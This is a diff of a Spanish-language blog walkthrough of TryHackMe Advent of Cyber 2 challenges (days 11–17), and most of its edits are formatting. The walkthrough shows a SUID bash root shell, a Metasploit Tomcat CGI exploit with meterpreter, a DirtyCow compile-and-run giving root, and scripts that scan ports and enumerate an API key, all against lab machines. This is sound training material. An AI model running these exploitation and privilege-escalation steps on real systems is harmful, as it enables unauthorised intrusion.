 </span><span class="s1">kali@kali:~/thm/adventcyber2$ smbclient \\\\10.10.77.26\\tbfc-it
@@ -2569,7 +2566,7 @@ kali@kali:~/thm/adventcyber2$
 <script>
   'use strict';
 
-  var containerId = JSON.parse("\"521f83c69789640e\"");
+  var containerId = JSON.parse("\"d4c63b21b382b2ad\"");
   var containerElem = document.getElementById(containerId);
   var codetabLinks = null;
   var codetabContents = null;
@@ -2603,11 +2600,11 @@ kali@kali:~/thm/adventcyber2$
     codetabContents[0].style.display = 'block';
   }
 </script>
-<h1 id="day-11---networking-">DAY 11 - Networking</h1>
+<h1 id="day-11---networking">DAY 11 - Networking</h1>
 <p>Se presenta una maquina en la cual tenemos acceso y es necesario escalar privilegios utilizando los &ldquo;comandos/guias&rdquo; de <a href="https://gtfobins.github.io/"><strong>GTFObins</strong></a>. Con la informacion descrita en el reto del dia es suficiente para resolver las tareas y obtener la flag. Enumeracion de archivos con permisos <em>SUID</em>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2635,7 +2632,7 @@ kali@kali:~/thm/adventcyber2$
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">-bash-4.4$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">-bash-4.4$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 -rwsr-xr-x <span class="m">1</span> root   root            1.1M Jun  <span class="m">6</span>  <span class="m">2019</span> /bin/bash
 -rwsr-xr-x <span class="m">1</span> root   root             31K Aug <span class="m">11</span>  <span class="m">2016</span> /bin/fusermount
 -rwsr-xr-x <span class="m">1</span> root   root             43K Sep <span class="m">16</span> 18:43 /bin/mount
@@ -2666,7 +2663,7 @@ kali@kali:~/thm/adventcyber2$
 </div><p>Utilizamos bash para obtener una shell root y la flag.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2679,7 +2676,7 @@ kali@kali:~/thm/adventcyber2$
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">-bash-4.4$ /bin/bash -p
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">-bash-4.4$ /bin/bash -p
 bash-4.4# <span class="nb">cd</span>
 bash-4.4# whoami<span class="p">;</span> <span class="nb">pwd</span>
 root
@@ -2692,12 +2689,12 @@ thm<span class="o">{</span>2fb1<span class="o">[</span>... snip ...<span class="
 bash-4.4#
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-12---networking-">DAY 12 - Networking</h1>
+</div><h1 id="day-12---networking">DAY 12 - Networking</h1>
 <p>Se presenta una maquina vulnerable a <em>ShellShock attack</em> utilizando metasploit y la informacion descrita en el reto del dia es posible resolver las tareas y obtener la flag.</p>
 <p>Configuracion de metasploit con el exploit <code>windows/http/tomcat_cgi_cmdlineargs</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2784,7 +2781,7 @@ bash-4.4#
 </span><span class="lnt">85
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 exploit<span class="o">(</span>windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span> &gt; show options 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 exploit<span class="o">(</span>windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span> &gt; show options 
 
 Module options <span class="o">(</span>exploit/windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span>:
 
@@ -2874,7 +2871,7 @@ C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software
 </div><p>Utilizando <code>local_exploit_suggester</code> para listar los exploits para la maquina que puedan ser utiles para escalar privilegios.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2883,7 +2880,7 @@ C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">meterpreter &gt; run post/multi/recon/local_exploit_suggester 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">meterpreter &gt; run post/multi/recon/local_exploit_suggester 
 
 <span class="o">[</span>*<span class="o">]</span> 10.10.92.152 - Collecting <span class="nb">local</span> exploits <span class="k">for</span> x86/windows...
 <span class="o">[</span>*<span class="o">]</span> 10.10.92.152 - <span class="m">30</span> exploit checks are being tried...
@@ -2895,7 +2892,7 @@ meterpreter &gt;
 </div><p>Aunque el usuario actual al parecer ya pertenece al grupo de Administradores.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2927,7 +2924,7 @@ meterpreter &gt;
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;whoami
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;whoami
 whoami
 tbfc-web-01<span class="se">\e</span>lfmcskidy
 
@@ -2959,7 +2956,7 @@ Local Group Memberships      *Administrators       *Users
 Global Group memberships     *None                 
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-13---coal-for-christmas-">DAY 13 - Coal for Christmas</h1>
+</div><h1 id="day-13---coal-for-christmas">DAY 13 - Coal for Christmas</h1>
 <p>Con la maquina dada se realiza las siguientes tareas con la ayuda de la descripcion de cada una:</p>
 <ul>
 <li>Port Scanning</li>
@@ -2967,11 +2964,11 @@ Global Group memberships     *None
 <li>Enumeration</li>
 <li>Privilege Escalation</li>
 </ul>
-<h2 id="port-scanning---nmap-">PORT SCANNING - NMAP</h2>
+<h2 id="port-scanning---nmap">PORT SCANNING - NMAP</h2>
 <p>Se realiza un escaneo de puertos donde encontramos los puertos ssh (22), telnet (23) y rpcbind (111).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2983,7 +2980,7 @@ Global Group memberships     *None
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 13:23 EST
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 13:23 EST
 Nmap scan report <span class="k">for</span> 10.10.155.23 <span class="o">(</span>10.10.155.23<span class="o">)</span>
 Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
 Not shown: <span class="m">997</span> closed ports
@@ -2995,11 +2992,11 @@ PORT    STATE SERVICE
 Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 52.89 seconds
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="initial-access---telnet-">INITIAL ACCESS - TELNET</h2>
+</div><h2 id="initial-access---telnet">INITIAL ACCESS - TELNET</h2>
 <p>A traves del puerto 23 de telnet realizamos la conexion donde se presentan unas credenciales con las cuales se logró obtener una shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3038,7 +3035,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">37
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ telnet 10.10.155.23 <span class="m">23</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ telnet 10.10.155.23 <span class="m">23</span>
 Trying 10.10.155.23...
 Connected to 10.10.155.23.
 Escape character is <span class="s1">&#39;^]&#39;</span>.
@@ -3077,11 +3074,11 @@ santa
 $ 
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="enumeration-">ENUMERATION</h2>
+</div><h2 id="enumeration">ENUMERATION</h2>
 <p>Version del sistema operativo <code>Ubuntu 12.04</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -3091,7 +3088,7 @@ $
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ uname -a
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ uname -a
 Linux christmas 3.2.0-23-generic <span class="c1">#36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</span>
 $ cat /etc/*release
 <span class="nv">DISTRIB_ID</span><span class="o">=</span>Ubuntu
@@ -3103,11 +3100,11 @@ $
 </div>
 </div><p>En la maquina existe un archivo el cual está escrito en C, que al realizar una busqueda de una porcion de codigo encontramos que es parte del exploit de dirtycow. Aunque en la descripcion del reto se explica esta parte.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201214_124125.png" alt="image" /></p>
-<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
 <p>Utilizando el <a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">codigo fuente</a> del exploit encontrado en la maquina para obtener una shell con usuario root, copiando el codigo fuente a la maquina, compilar y ejecutar.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3180,7 +3177,7 @@ $
 </span><span class="lnt">71
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ gcc -pthread dirty.c -o dirty -lcrypt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ gcc -pthread dirty.c -o dirty -lcrypt
 $ ls -lah
 total 44K
 drwxr-xr-x <span class="m">3</span> santa santa 4.0K Dec <span class="m">15</span> 00:46 .
@@ -3253,7 +3250,7 @@ firefart@christmas:~# tree <span class="p">|</span> md5sum
 firefart@christmas:~#
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-14---wheres-rudolph-">DAY 14 - Where&rsquo;s Rudolph?</h1>
+</div><h1 id="day-14---wheres-rudolph">DAY 14 - Where&rsquo;s Rudolph?</h1>
 <p>Se presenta un reto en el cual involucra un nombre de usuario: <code>IGuidetheClaus2020</code>. con el cual debemos de recabar informacion utilizando fuentes de datos abiertas (OSINT). Para las tareas del 1-5 debemos de indagar en el subreddit de este usuario, para la 6-11 en su cuenta de Twitter.</p>
 <ul>
 <li>
@@ -3294,7 +3291,7 @@ firefart@christmas:~#
 </ul>
 <p>Del porqué esa direccion, es porque tambien mencionó en uno de sus twitts que la foto era cerca de su hotel y tiempo despues mencionó el hotel Marriot.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201214_142351.png" alt="image" /></p>
-<h1 id="day-15---scripting-">DAY 15 - Scripting</h1>
+<h1 id="day-15---scripting">DAY 15 - Scripting</h1>
 <p>Se presenta una serie de tareas relacionadas al lenguaje de programacion Python las cuales es posible resolver con la descripcion del reto del dia y utilizando una consola de Python.</p>
 <details>
   <summary>Spoiler warning</summary>  
@@ -3317,7 +3314,7 @@ firefart@christmas:~#
     pass by reference
 </code></pre>
 </details>
-<h1 id="day-16---scripting-">DAY 16 - Scripting</h1>
+<h1 id="day-16---scripting">DAY 16 - Scripting</h1>
 <p>Continuando con scripting, se presenta una maquina a la cual hay que encontrar:</p>
 <ul>
 <li>Puerto donde esta corriendo la pagina web.</li>
@@ -3326,7 +3323,7 @@ firefart@christmas:~#
 </ul>
 <p>Utilizando el modulo <code>python-nmap</code> de <a href="https://pypi.org/project/python-nmap/"><strong>PyPI</strong></a> creamos un pequeño script para escaneo de puertos, con el cual encontramos el puerto <strong>8000</strong> abierto.</p>
 
-<div id="23966aedf8b9abe1" class="codetab">
+<div id="2211617d5a9736a6" class="codetab">
   <div class="codetab__links">
     
       <button class="codetab__link" aria-label="Tab link">java</button>
@@ -3340,7 +3337,7 @@ firefart@christmas:~#
 <div id="cd138f946a2c779b" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3364,7 +3361,7 @@ firefart@christmas:~#
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python:script1.py" data-lang="python:script1.py"><span class="ch">#!/usr/bin/env python</span>
+<pre tabindex="0" class="chroma"><code class="language-python:script1.py" data-lang="python:script1.py"><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">nmap</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;10.10.133.55&#39;</span>
@@ -3373,19 +3370,19 @@ firefart@christmas:~#
 <span class="n">nm</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="s1">&#39;-p- --min-rate 1000 -sV&#39;</span><span class="p">)</span>
 
 <span class="k">for</span> <span class="n">host</span> <span class="ow">in</span> <span class="n">nm</span><span class="o">.</span><span class="n">all_hosts</span><span class="p">():</span>
-    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span> <span class="s1">&#39;Host:{} {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">hostname</span><span class="p">())</span> <span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span> <span class="s1">&#39;Estado: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">state</span><span class="p">())</span> <span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span> <span class="s1">&#39;Host:</span><span class="si">{}</span><span class="s1"> </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">hostname</span><span class="p">())</span> <span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span> <span class="s1">&#39;Estado: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">state</span><span class="p">())</span> <span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
     
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">]</span><span class="o">.</span><span class="n">all_protocols</span><span class="p">():</span>
-      <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Protocolo: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-      <span class="k">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
+      <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Protocolo: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+      <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----------------------------------------------------&#39;</span><span class="p">)</span>
         <span class="n">ports</span> <span class="o">=</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
         <span class="n">ports</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
 
         <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
-          <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Puerto: {} </span><span class="se">\t</span><span class="s1"> Estado: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">port</span><span class="p">][</span><span class="s2">&#34;state&#34;</span><span class="p">]))</span>
+          <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Puerto: </span><span class="si">{}</span><span class="s1"> </span><span class="se">\t</span><span class="s1"> Estado: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">nm</span><span class="p">[</span><span class="n">host</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="n">port</span><span class="p">][</span><span class="s2">&#34;state&#34;</span><span class="p">]))</span>
 </code></pre></td></tr></table>
 </div>
 </div>
@@ -3395,7 +3392,7 @@ firefart@christmas:~#
 <div id="cda2acdeb395abc9" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -3406,7 +3403,7 @@ firefart@christmas:~#
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script2.py 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script2.py 
 ----------------------------------------------------
 Host:10.10.133.55 10.10.133.55
 Estado: up
@@ -3426,7 +3423,7 @@ kali@kali:~/thm/adventcyber2$
 <script>
   'use strict';
 
-  var containerId = JSON.parse("\"23966aedf8b9abe1\"");
+  var containerId = JSON.parse("\"2211617d5a9736a6\"");
   var containerElem = document.getElementById(containerId);
   var codetabLinks = null;
   var codetabContents = null;
@@ -3462,7 +3459,7 @@ kali@kali:~/thm/adventcyber2$
 </script>
 <p>Nuevamente utilizando Python y con la lo aprendido el Dia 15 extrajimos todos las direcciones o links dentro de la pagina.</p>
 
-<div id="9c8238c0cd5c5932" class="codetab">
+<div id="b343a1bba3b07af3" class="codetab">
   <div class="codetab__links">
     
       <button class="codetab__link" aria-label="Tab link">python</button>
@@ -3475,7 +3472,7 @@ kali@kali:~/thm/adventcyber2$
 <div id="2e8acc816829a395" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3487,7 +3484,7 @@ kali@kali:~/thm/adventcyber2$
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python:script2.py" data-lang="python:script2.py"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python:script2.py" data-lang="python:script2.py"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
 
 <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.133.55:8000/static/index.html&#34;</span>
@@ -3496,7 +3493,7 @@ kali@kali:~/thm/adventcyber2$
 <span class="n">links</span> <span class="o">=</span>  <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
 
 <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">links</span><span class="p">:</span>
-  <span class="k">print</span><span class="p">(</span><span class="n">link</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">))</span>
+  <span class="nb">print</span><span class="p">(</span><span class="n">link</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div>
@@ -3506,7 +3503,7 @@ kali@kali:~/thm/adventcyber2$
 <div id="8ddc1242d6c980f3" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3545,7 +3542,7 @@ kali@kali:~/thm/adventcyber2$
 </span><span class="lnt">37
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script3.py 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script3.py 
 ../
 None
 
@@ -3561,25 +3558,25 @@ https://tryhackme.com
 https://tryhackme.com
 https://tryhackme.com
 https://tryhackme.com
-#
-#
-#
-#
-#
-#
-#
-#
-#
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
 http://machine_ip/api/api_key
-#
-#
-#
-#
-#
-#
-#
-#
-#
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
+<span class="c1">#</span>
 https://github.com/BulmaTemplates/bulma-templates
 https://github.com/BulmaTemplates/bulma-templates
 </code></pre></td></tr></table>
@@ -3593,7 +3590,7 @@ https://github.com/BulmaTemplates/bulma-templates
 <script>
   'use strict';
 
-  var containerId = JSON.parse("\"9c8238c0cd5c5932\"");
+  var containerId = JSON.parse("\"b343a1bba3b07af3\"");
   var containerElem = document.getElementById(containerId);
   var codetabLinks = null;
   var codetabContents = null;
@@ -3629,7 +3626,7 @@ https://github.com/BulmaTemplates/bulma-templates
 </script>
 <p>Para poder encontrar el valor correcto de la <code>api_key</code> utilizamos un pequeño script el cual realizaba solicitude hacia la API.</p>
 
-<div id="cae6973682a7b4f2" class="codetab">
+<div id="3e5c7d313050d00c" class="codetab">
   <div class="codetab__links">
     
       <button class="codetab__link" aria-label="Tab link">python</button>
@@ -3643,7 +3640,7 @@ https://github.com/BulmaTemplates/bulma-templates
 <div id="5b31ffeba21457ed" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3657,7 +3654,7 @@ https://github.com/BulmaTemplates/bulma-templates
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python:script3.py" data-lang="python:script3.py"><span class="ch">#!/usr/bin/env python</span>
+<pre tabindex="0" class="chroma"><code class="language-python:script3.py" data-lang="python:script3.py"><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 
 <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.133.55:8000/api/&#34;</span>
@@ -3666,9 +3663,9 @@ https://github.com/BulmaTemplates/bulma-templates
   <span class="n">n</span> <span class="o">=</span> <span class="n">i</span> <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">0</span>
 
   <span class="k">if</span> <span class="n">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
     <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div>
@@ -3678,7 +3675,7 @@ https://github.com/BulmaTemplates/bulma-templates
 <div id="7e19651ce3bf9838" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -3707,7 +3704,7 @@ https://github.com/BulmaTemplates/bulma-templates
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script4.py 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ python script4.py 
 <span class="m">1</span>
 <span class="o">{</span><span class="s2">&#34;item_id&#34;</span>:1,<span class="s2">&#34;q&#34;</span>:<span class="s2">&#34;SANTA PROTECTION MECHANISM ACTIVATED.&#34;</span><span class="o">}</span>
 <span class="m">3</span>
@@ -3745,7 +3742,7 @@ https://github.com/BulmaTemplates/bulma-templates
 <script>
   'use strict';
 
-  var containerId = JSON.parse("\"cae6973682a7b4f2\"");
+  var containerId = JSON.parse("\"3e5c7d313050d00c\"");
   var containerElem = document.getElementById(containerId);
   var codetabLinks = null;
   var codetabContents = null;
@@ -3779,7 +3776,7 @@ https://github.com/BulmaTemplates/bulma-templates
     codetabContents[0].style.display = 'block';
   }
 </script>
-<h1 id="day-17---reverse-engineering-">DAY 17 - Reverse Engineering</h1>
+<h1 id="day-17---reverse-engineering">DAY 17 - Reverse Engineering</h1>
 <p>Las instrucciones para el reto del dia incluyen utilizar la herramienta <code>radare2</code> el cual es un framework para realizar ingenieria inversa y analisis de binarios. La descripcion del reto es suficiente para obtener las respuestas.</p>
 <ul>
 <li>Valor de <code>local_ch</code> cuando la instruccion <code>movl</code> es &ldquo;ejecutada&rdquo;.</li>
@@ -3789,7 +3786,7 @@ https://github.com/BulmaTemplates/bulma-templates
